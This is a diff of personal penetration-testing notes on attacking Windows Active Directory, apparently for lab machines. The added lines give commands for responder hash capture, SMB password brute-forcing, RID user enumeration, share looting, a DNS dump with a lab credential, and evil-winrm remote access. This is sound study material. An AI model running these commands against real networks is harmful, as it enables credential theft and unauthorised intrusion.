@@ -64,6 +64,10 @@ for some things we need a similar time as the dc (within one minute)
 
 
 ### Listen with responder
+
+start responder so it's there listening in the background
+`sudo responder -I tun0 -wd`
+
 - more: [[../29 - C2s, listening tools/responder|responder]] 
 - examples to make people connect to responder:
 	- send an e-mail with a smb link
@@ -80,9 +84,18 @@ for some things we need a similar time as the dc (within one minute)
 `nxc smb 10.10.10.10 -u 'guest' -p ''`
 `nxc smb 10.10.10.10 -u 'guest' -p '' --shares`
 
-`smbclient -L //10.10.10.10 -U '' -N` (-N = no pass)
+`smbclient -U '' -N -L //10.10.10.10` (-N = no pass)
 
 ### User... Enumeration
+
+##### username but no password?
+brute force password
+`nxc smb 10.10.10.10 -u 'username' -p 'password-file'`
+
+##### Finding user names
+Is there a web page?
+Files on shares (null session)?
+Other ports open, like ftp?
 
 ##### [[impacket-GetNPUsers]]
 
@@ -111,15 +124,44 @@ Brute Force with creds pairs in file
 
 ### Escalation - When we own a user
 
+enum usernames
+`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --rid-brute`
+(rid is the end of the sid)
+
+get password policy
+`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --pass-pol`
+
+list files on shares (can download too)
+`nxc smb 10.10.10.10 -u '' -p '' -M spider_plus`
+
+##### DNS dump
+
+`bloodyAD --host 10.129.176.2 -d return.local -u 'return\svc-printer' -p '1edFg43012!!' get dnsDump`
+
+##### Are 5985/5986/47001 open? [[../09 - Windows Exploration/Evil-WinRM|Evil-WinRM]]
+`evil-winrm -i 10.10.10.10 -u username -p password`
+(Requires admin or remote management permissions)
+
+##### RDP
+TODO!
+
+
 add stuff on:
+ldapsearch
 impacket-owneredit
 impacket-dacledit
 bloodyAD
 
 ##### [[ldapdomaindump - dump domain info]]
-`ldapdomaindump ldap://10.10.10.10 -u domain.com\\mynormaluser -p mypassword`
+`ldapdomaindump ldap://10.10.10.10 -u 'domain.com\\mynormaluser' -p 'mypassword'`
+- check the description field from users and computers
+- check if some users have logged in - might be honey pots
 
 ##### [[Bloodhound]]
+
+clear old data:
+- Go to neo4j at http://localhost:7474
+- In the field containing `neo4j$`, enter `MATCH (n) DETACH DELETE n;`
 
 on windows:
 `Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs`
